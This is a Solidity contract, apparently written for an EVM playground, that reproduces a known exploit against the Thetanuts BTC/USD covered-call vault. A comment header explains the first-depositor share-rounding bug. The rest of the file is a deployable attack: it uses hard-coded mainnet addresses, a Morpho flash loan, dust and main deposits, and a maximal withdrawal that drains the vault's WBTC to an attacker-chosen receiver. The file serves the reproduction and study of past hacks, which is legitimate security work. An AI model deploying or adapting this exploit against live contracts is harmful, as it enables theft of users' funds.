// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// SYNTHETIC exploit for the EVM Playground — a standalone contract reproducing the inline attack
// from DeFiHackLabs' ThetanutsVaultShareRounding_exp.sol (the Foundry test is itself the Morpho
// flash-loan receiver, with onMorphoFlashLoan on the test). Here the same logic lives in a
// deployable contract whose run() drives the attack and forwards the WBTC profit to `receiver`.
//
// Bug: the Thetanuts BTC/USD covered-call vault holds pre-existing WBTC while totalSupply() == 0.
// The first depositor therefore mints shares against an empty share supply but a non-empty asset
// balance (classic first-depositor / share-rounding vault bug). The attacker flash-borrows WBTC,
// deposits 2 wei (mints 1 share), deposits the main amount (mints shares ~1:1), then
// initWithdraw(type(uint256).max) burns those shares and redeems nearly the entire vault WBTC
// balance — including the pre-existing WBTC that was never backed by shares.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IThetanutsVault {
    function deposit(uint256 amount) external returns (uint256 shares);
    function initWithdraw(uint256 shares) external returns (uint256 assets);
}

interface IMorphoBlueFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

contract ThetanutsExploit {
    address constant MORPHO_BLUE = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant VAULT = 0x80b8EEb34A2Ba5dd90c61e02a12eA30515dCa6f5;
    uint256 constant FLASH_LOAN_AMOUNT = 10 * 1e8; // 10 WBTC

    address private immutable receiver;

    constructor(address receiver_) {
        receiver = receiver_;
    }

    function run() external {
        IERC20(WBTC).approve(VAULT, type(uint256).max);
        IERC20(WBTC).approve(MORPHO_BLUE, type(uint256).max);

        // Borrow WBTC from Morpho; Morpho calls onMorphoFlashLoan, then pulls the loan back.
        IMorphoBlueFlashLoan(MORPHO_BLUE).flashLoan(WBTC, FLASH_LOAN_AMOUNT, "");

        // Forward the drained WBTC to the attacker.
        IERC20(WBTC).transfer(receiver, IERC20(WBTC).balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO_BLUE, "only Morpho callback");

        // Seed the zero-supply vault with a dust deposit (mints 1 share).
        IThetanutsVault(VAULT).deposit(2);

        // Deposit the main WBTC amount at the vulnerable share rate.
        IThetanutsVault(VAULT).deposit(468_000_000);

        // Oversized withdraw burns the attacker's shares and releases the vault's WBTC,
        // including the pre-existing balance that was never backed by shares.
        IThetanutsVault(VAULT).initWithdraw(type(uint256).max);
    }
}
